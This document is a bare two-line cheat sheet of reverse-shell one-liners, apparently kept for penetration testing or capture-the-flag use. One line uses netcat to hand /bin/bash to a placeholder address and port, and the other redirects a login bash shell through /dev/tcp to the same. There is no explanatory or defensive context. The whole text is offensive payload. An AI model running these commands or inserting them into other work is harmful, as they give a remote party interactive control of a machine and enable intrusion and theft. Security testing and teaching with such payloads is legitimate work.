nc $IP $PORT -e /bin/bash

/bin/bash -l > /dev/tcp/$IP/$PORT 0<&1 2>&1